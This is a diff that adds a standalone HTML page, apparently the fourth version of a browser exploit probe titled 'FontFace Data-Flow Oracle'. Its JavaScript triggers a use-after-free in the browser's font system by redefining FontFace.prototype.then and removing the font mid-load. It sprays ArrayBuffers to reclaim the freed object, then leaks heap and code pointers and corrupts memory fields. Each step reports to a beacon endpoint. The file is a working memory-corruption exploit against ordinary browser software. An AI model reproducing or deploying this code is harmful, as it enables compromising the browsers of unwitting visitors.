@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P846v4</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P846v4: FontFace Data-Flow Oracle (exact proven pattern)</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P846v4-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+
+bn('BOOT','start');
+log('Running FontFace UAF with exact proven pattern...','info');
+
+/* ===================================================================
+   EXACT PROVEN PATTERN from working probes (P834/P835 era).
+   Key difference: fonts.check() + offsetHeight INSIDE the .then getter
+   AFTER the spray. This forces the font system to access the stale
+   CSSFontFace pointer, writing data INTO our AB(192).
+   =================================================================== */
+
+var fontAB=null, fabsA=[], face=null;
+
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stA);
+
+face=new FontFace('fA',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var ffiredA=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffiredA)return undefined;
+    ffiredA=true;
+    /* Step 1: Remove CSS rule (destroys CSS-side CSSFontFace) */
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    /* Step 2: Remove from FontFaceSet */
+    try{document.fonts.delete(this);}catch(e){}
+    /* Step 3: Force layout (triggers style recalc / cleanup) */
+    document.body.offsetHeight;
+    /* Step 4: Spray AB(192) */
+    fabsA=[];
+    for(var i=0;i<80;i++)fabsA.push(new ArrayBuffer(192));
+    /* Step 5: fonts.check — CRITICAL: forces font system to access stale ref */
+    try{document.fonts.check('1em bbA');}catch(e){}
+    /* Step 6: Second layout force */
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+
+document.fonts.load('1em fA, bbA','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Scan for the hit — look for nonzero bytes written by font system */
+  for(var i=0;i<fabsA.length;i++){
+    var bu=new BigUint64Array(fabsA[i]);
+    for(var j=0;j<bu.length;j++){
+      if(bu[j]!==BigInt(0)){fontAB=fabsA[i];break;}
+    }
+    if(fontAB)break;
+  }
+
+  if(!fontAB){
+    bn('A1-MISS','80ab');
+    log('Attempt 1 (80 AB, proven pattern): MISS','fail');
+
+    /* ===== ATTEMPT 2: Same pattern, wider spray ===== */
+    log('Trying attempt 2 (500 AB)...','info');
+
+    var stB=document.createElement('style');
+    stB.textContent="@font-face{font-family:bbB;src:local(Arial);unicode-range:U+0043;}";
+    document.head.appendChild(stB);
+    var faceB=new FontFace('fB',"local('Helvetica')",{unicodeRange:'U+0043'});
+    document.fonts.add(faceB);
+    void faceB.loaded;
+
+    var ffiredB=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(ffiredB)return undefined;
+        ffiredB=true;
+        if(stB){stB.remove();stB.textContent='';stB=null;}
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabsA=[];
+        for(var i=0;i<500;i++)fabsA.push(new ArrayBuffer(192));
+        try{document.fonts.check('1em bbB');}catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}
+    });
+    document.fonts.load('1em fB, bbB','CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+      for(var i=0;i<fabsA.length;i++){
+        var bu=new BigUint64Array(fabsA[i]);
+        for(var j=0;j<bu.length;j++){
+          if(bu[j]!==BigInt(0)){fontAB=fabsA[i];face=faceB;break;}
+        }
+        if(fontAB)break;
+      }
+
+      if(!fontAB){
+        bn('A2-MISS','500ab');
+        log('Attempt 2 (500 AB): MISS','fail');
+
+        /* ===== ATTEMPT 3: Multi-size spray ===== */
+        log('Trying attempt 3 (multi-size: 176/192/208)...','info');
+
+        var stC=document.createElement('style');
+        stC.textContent="@font-face{font-family:bbC;src:local(Arial);unicode-range:U+0044;}";
+        document.head.appendChild(stC);
+        var faceC=new FontFace('fC',"local('Helvetica')",{unicodeRange:'U+0044'});
+        document.fonts.add(faceC);
+        void faceC.loaded;
+
+        var ffiredC=false,multiABs={};
+        Object.defineProperty(FontFace.prototype,'then',{
+          configurable:true,
+          get:function(){
+            if(ffiredC)return undefined;
+            ffiredC=true;
+            if(stC){stC.remove();stC.textContent='';stC=null;}
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            /* Multi-size spray: CSSFontFace might not be exactly 192B */
+            multiABs={};
+            var sizes=[160,176,192,208,224,240,256];
+            for(var si=0;si<sizes.length;si++){
+              var sz=sizes[si];
+              multiABs[sz]=[];
+              for(var i=0;i<200;i++)multiABs[sz].push(new ArrayBuffer(sz));
+            }
+            try{document.fonts.check('1em bbC');}catch(e){}
+            document.body.offsetHeight;
+            return undefined;
+          },set:function(){}
+        });
+        document.fonts.load('1em fC, bbC','EF');
+
+        setTimeout(function(){
+          delete FontFace.prototype.then;
+          var hitSz=0;
+          var sizes=[160,176,192,208,224,240,256];
+          for(var si=0;si<sizes.length;si++){
+            var sz=sizes[si];
+            var arr=multiABs[sz];
+            if(!arr)continue;
+            for(var i=0;i<arr.length;i++){
+              var bu=new BigUint64Array(arr[i]);
+              for(var j=0;j<bu.length;j++){
+                if(bu[j]!==BigInt(0)){fontAB=arr[i];face=faceC;hitSz=sz;break;}
+              }
+              if(fontAB)break;
+            }
+            if(fontAB)break;
+          }
+
+          if(!fontAB){
+            bn('A3-MISS','multi-size');
+            log('Attempt 3 (multi-size): MISS','fail');
+            log('','');
+            log('ALL attempts failed. FontFace UAF not triggering.','fail');
+            log('Possible: CSSFontFace not freed during .then getter on this browser state.','fail');
+            bn('DONE-MISS','3x');
+            log('====== P846v4 DONE (no UAF) ======','hot');
+            return;
+          }
+
+          bn('A3-HIT','sz='+hitSz);
+          log('Attempt 3 HIT at size '+hitSz+'!','ok');
+          runOracle();
+        },500);
+        return;
+      }
+
+      bn('A2-HIT','500ab');
+      log('Attempt 2 HIT!','ok');
+      runOracle();
+    },500);
+    return;
+  }
+
+  bn('A1-HIT','80ab');
+  log('Attempt 1 HIT!','ok');
+  runOracle();
+},500);
+
+/* ============================================================
+   THE ORACLE
+   ============================================================ */
+function runOracle(){
+  var bu=new BigUint64Array(fontAB);
+  var u8=new Uint8Array(fontAB);
+  var H=bu[11]-BigInt(0x68);
+  var q13=bu[13];
+  log('','');
+  log('--- UAF HIT ---','ok');
+  log('H = '+hexQ(H),'ok');
+  log('q13 = '+hexQ(q13)+' (CSSFontSelector*)','ok');
+  bn('HEAP','H='+hexQ(H)+'|q13='+hexQ(q13));
+
+  /* Baseline */
+  var BL=[];
+  for(var i=0;i<24;i++)BL.push(bu[i]);
+  var nz=0,codeB=[];
+  for(var i=0;i<24;i++){
+    var v=BL[i]; if(v===BigInt(0))continue; nz++;
+    var hi=Number(v>>BigInt(32));
+    var tag=(hi>=0x10&&hi<=0x1000)?'H':(hi>0x10&&hi<0x8000)?'C':(hi>=0xFFFF8000)?'K':'?';
+    if(tag==='C'||tag==='K')codeB.push('q'+i+'='+hexQ(v));
+    log('  q'+i.toString().padStart(2,' ')+' +0x'+(i*8).toString(16).padStart(3,'0')+' = '+hexQ(v)+' ['+tag+']',
+      tag==='C'||tag==='K'?'hot':'info');
+  }
+  bn('BL','nz='+nz+'|code='+codeB.length+(codeB.length?'|'+codeB.join('|'):''));
+
+  /* C: m_status sweep */
+  log('','');
+  log('--- C: m_status sweep ---','hot');
+  var SO=130;
+  var cSum=[];
+  for(var s=0;s<=4;s++){
+    var snap=new Uint8Array(fontAB.byteLength); snap.set(u8);
+    u8[SO]=s;
+    var err=null;
+    try{face.load();}catch(e){err=e.name;}
+    var chg=[],code=[];
+    for(var i=0;i<u8.length;i++)if(u8[i]!==snap[i])chg.push('+'+i.toString(16)+'='+snap[i].toString(16)+'→'+u8[i].toString(16));
+    for(var qi=0;qi<bu.length;qi++){var v=bu[qi];if(v!==BL[qi]&&v!==BigInt(0)){var hi=Number(v>>BigInt(32));if((hi>0x10&&hi<0x8000)||(hi>=0xFFFF8000))code.push('q'+qi);}}
+    cSum.push('s'+s+(err?'E':'')+'c'+chg.length+'p'+code.length);
+    log('  s='+s+': '+(err||'ok')+' chg='+chg.length+(code.length?' ***CODE***':'')+
+      (chg.length?' '+chg.slice(0,3).join(' '):''),code.length?'hot':(chg.length?'ok':''));
+    u8.set(snap);
+  }
+  bn('C',cSum.join('|'));
+
+  /* E: Zero each qword */
+  log('','');
+  log('--- E: Zero-load per qword ---','hot');
+  var eHits=[];
+  for(var qi=0;qi<bu.length;qi++){
+    var orig=bu[qi]; bu[qi]=BigInt(0); u8[SO]=0;
+    try{face.load();}catch(e){}
+    var nv=bu[qi];
+    if(nv!==BigInt(0)){
+      var hi=Number(nv>>BigInt(32));
+      var tag=(hi>0x10&&hi<0x8000)?'CODE':(hi>=0xFFFF8000)?'KERN':(nv===orig)?'rest':'new';
+      eHits.push('q'+qi+'('+tag+')');
+      log('  q'+qi+': →'+hexQ(nv)+' ['+tag+']',tag==='CODE'||tag==='KERN'?'hot':'ok');
+    }
+    bu[qi]=orig; u8[SO]=2;
+  }
+  bn('E','n='+eHits.length+'|'+eHits.join('|'));
+  if(!eHits.length)log('  No rewrites','fail');
+
+  /* I: Property writes */
+  log('','');
+  log('--- I: Face prop writes ---','hot');
+  var snapI=new Uint8Array(fontAB.byteLength); snapI.set(u8);
+  try{face.family='XXX';}catch(e){}
+  try{face.style='italic';}catch(e){}
+  try{face.weight='bold';}catch(e){}
+  try{face.display='swap';}catch(e){}
+  var iChg=[],iCode=[];
+  for(var i=0;i<u8.length;i++)if(u8[i]!==snapI[i])iChg.push('+'+i.toString(16)+'='+snapI[i].toString(16)+'→'+u8[i].toString(16));
+  for(var qi=0;qi<bu.length;qi++){var v=bu[qi];if(v!==BL[qi]&&v!==BigInt(0)){var hi=Number(v>>BigInt(32));if((hi>0x10&&hi<0x8000)||(hi>=0xFFFF8000))iCode.push('q'+qi+'='+hexQ(v));}}
+  bn('I','chg='+iChg.length+'|code='+iCode.length+(iChg.length?'|'+iChg.slice(0,8).join(','):'')+
+    (iCode.length?'|CODE='+iCode.join(','):''));
+  log('  writes: '+iChg.length+' byte changes'+(iCode.length?' ***CODE***':''),
+    iCode.length?'hot':(iChg.length?'ok':'info'));
+  if(iChg.length)log('  '+iChg.slice(0,6).join(' '),'info');
+
+  log('','');
+  log('====== P846v4 COMPLETE ======','hot');
+  bn('DONE','H='+hexQ(H)+'|q13='+hexQ(q13)+'|cB='+codeB.length);
+}
+</script></body></html>
